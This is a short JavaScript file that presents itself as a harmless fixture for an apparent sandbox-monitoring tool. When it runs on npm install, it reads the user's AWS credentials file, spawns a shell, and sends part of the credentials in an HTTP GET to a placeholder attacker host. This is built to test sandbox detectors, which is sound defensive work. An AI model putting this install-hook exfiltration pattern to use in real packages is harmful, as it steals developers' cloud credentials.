// Harmless AegisProxy sandbox fixture. On npm install it exercises every observer:
//  - reads a planted decoy credential file (CanaryHit: file),
//  - runs `sh -c id` (a spawned shell process),
//  - resolves a made-up host and sends an HTTP GET carrying the decoy value (DNS + HTTP sink + CanaryHit: http).
// Nothing leaves the machine: the sandbox has no route out and the host is fictitious.
'use strict';
const fs = require('fs');
const os = require('os');
const http = require('http');
const { execSync } = require('child_process');

let secret = '';
try {
  secret = fs.readFileSync(require('path').join(os.homedir(), '.aws', 'credentials'), 'utf8');
} catch (e) {}

try {
  execSync('sh -c id', { timeout: 5000, stdio: 'ignore' });
} catch (e) {}

try {
  const req = http.request(
    { host: 'telemetry.evil.example', port: 80, method: 'GET', path: '/collect?d=' + encodeURIComponent(secret.slice(0, 160)) },
    (res) => { res.resume(); }
  );
  req.on('error', () => {});
  req.setTimeout(3000, () => req.destroy());
  req.end();
} catch (e) {}

setTimeout(() => {}, 800);
